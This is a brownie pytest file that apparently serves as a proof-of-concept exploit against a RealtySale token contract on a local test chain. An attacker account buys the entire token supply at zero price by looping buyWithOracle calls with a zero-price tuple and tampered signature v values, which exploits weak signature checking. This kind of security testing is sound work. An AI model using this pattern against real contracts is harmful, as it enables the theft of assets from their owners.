from brownie import accounts, RealtySale, RealtyToken, Contract
import pytest
import web3
from web3 import Web3
from eth_abi.packed import encode_packed
from eth_account.messages import encode_defunct
web3 = Web3(Web3.HTTPProvider("HTTP://127.0.0.1:8545"))

@pytest.fixture(scope="function", autouse=True)
def sales():
    attacker = accounts.add()
    dep = accounts.add()
    return RealtySale.deploy({'from': dep}),attacker, dep 

@pytest.fixture
def token(sales):
    token =RealtyToken.at(sales[0].shareToken())
    return token

@pytest.fixture
def sig(sales):
    sprice = {'expires': '1 day', 'price': '0 wei'}
    encoded_msg = encode_packed(['string', 'string'], [sprice['expires'], sprice['price']])
    msghash = web3.solidityKeccak(['bytes32'], [encoded_msg])
    message =encode_defunct(msghash)
    sigx = web3.eth.account.sign_message(message, sales[2].private_key)
    return sigx.v,sigx.r,sigx.s


@pytest.mark.parametrize('v',[ 34,27, 30, 60, 28])

def test_buyWithOracle(sales, token, v,sig):
    sprice = {'expires': 10000000000000000, 'price': 0}
    while(True):
        if(token.lastTokenID() != 100):
            sales[0].buyWithOracle((sprice['expires'],sprice['price']), (v, sig[1], sig[2]), {'from': sales[1]})
        else:
            break
    assert(token.balanceOf(sales[1]) == token.maxSupply()) 

